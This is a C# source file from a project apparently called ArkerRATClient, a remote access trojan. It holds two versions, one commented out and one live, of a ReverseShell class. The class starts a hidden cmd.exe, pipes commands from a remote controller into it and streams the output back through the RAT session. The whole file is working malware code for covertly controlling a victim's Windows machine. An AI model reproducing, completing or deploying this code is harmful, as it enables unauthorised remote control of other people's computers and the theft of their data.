//using ArkerRATClient;
//using System;
//using System.Collections.Generic;
//using System.Diagnostics;
//using System.Linq;
//using System.Text;
//using System.Threading;
//using System.Threading.Tasks;

//namespace ARKERRATCLIENT2._0
//{
//    public static class ReverseShell
//    {
//        public static Process cmd;
//        static bool hasStarted = false;
//       static ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd");
//       static string StandardError = "";

//        static object _lock = new object();
//        public static void reverseCMDSession(string data)
//        {           
//                if (!hasStarted)
//                {
//                    processStartInfo.FileName = "cmd.exe";
//                    processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
//                    processStartInfo.UseShellExecute = false;
//                    processStartInfo.RedirectStandardInput = true;
//                    processStartInfo.RedirectStandardOutput = true;
//                    processStartInfo.RedirectStandardError = true;
//                    processStartInfo.CreateNoWindow = true;
//                    cmd = Process.Start(processStartInfo);
//                    hasStarted = true;

//                    //FUNGEWRAR EJ MED STANDARERROR
//                    Task.Run(async () =>
//                    {

//                        while (hasStarted && !RATClientSession.noConnection)
//                        {
//                            await Task.Run(async () =>
//                            {

//                                try
//                                {

//                                        if (StandardError.Length > 1)
//                                        {
//                                            await RATClientSession.SendData("§ReverseShellStart§" + StandardError +"\n" +"§ReverseShellEnd§");
//                                            StandardError = "";
//                                        }
//                                        else
//                                        {
//                                            await RATClientSession.SendData("§ReverseShellStart§" + cmd.StandardOutput.ReadLine()+"\n" + "§ReverseShellEnd§");
//                                        }
//                                }
//                                catch { }

//                            });
//                            Task.Run(() =>
//                            {
//                                try
//                                {
//                                    StandardError += cmd.StandardError.ReadLine();
//                                }
//                                catch { }
//                            });

//                        }
//                    });


//                }

//                if (data.Contains("close") || RATClientSession.noConnection)
//                {
//                    hasStarted = false;
//                    cmd.Kill();
//                }
//                else
//                {
//                    cmd.StandardInput.WriteLine(data);
//                }            
//        }
//    }
//}
using ArkerRATClient;
using System;
using System.Diagnostics;
using System.Threading.Tasks;

namespace ARKERRATCLIENT2._0
{
    public static class ReverseShell
    {
        private static Process cmd;
        private static bool hasStarted = false;
        private static ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd");
        private static string standardError = "";

        private static object lockObject = new object();

        public static void ReverseCMDSession(string data)
        {
            
                if (!hasStarted)
                {
                    processStartInfo.FileName = "cmd.exe";
                    processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
                    processStartInfo.UseShellExecute = false;
                    processStartInfo.RedirectStandardInput = true;
                    processStartInfo.RedirectStandardOutput = true;
                    processStartInfo.RedirectStandardError = true;
                    processStartInfo.CreateNoWindow = true;

                    cmd = new Process();
                    cmd.StartInfo = processStartInfo;
                    cmd.OutputDataReceived += Cmd_OutputDataReceived;
                    cmd.ErrorDataReceived += Cmd_ErrorDataReceived;
                    cmd.EnableRaisingEvents = true;
                    cmd.Exited += Cmd_Exited;

                    cmd.Start();
                    cmd.BeginOutputReadLine();
                    cmd.BeginErrorReadLine();

                    hasStarted = true;
                }

                if (data.Contains("close") || RATClientSession.noConnection)
                {
                    hasStarted = false;
                    cmd.Close();
                }
                else
                {
                    cmd.StandardInput.WriteLine(data);
                }
            
        }

        private static async void Cmd_OutputDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                await SendOutputData("§ReverseShellStart§" + e.Data + "\n" + "§ReverseShellEnd§");
            }
        }

        private static async void Cmd_ErrorDataReceived(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                standardError += e.Data;
                await SendOutputData("§ReverseShellStart§" + standardError + "\n" + "§ReverseShellEnd§");
                standardError = "";
            }
        }

        private static Task SendOutputData(string output)
        {
            return Task.Run(async () =>
            {
                await RATClientSession.SendData(output);
            });
        }

        private static void Cmd_Exited(object sender, EventArgs e)
        {
            hasStarted = false;
        }
    }
}
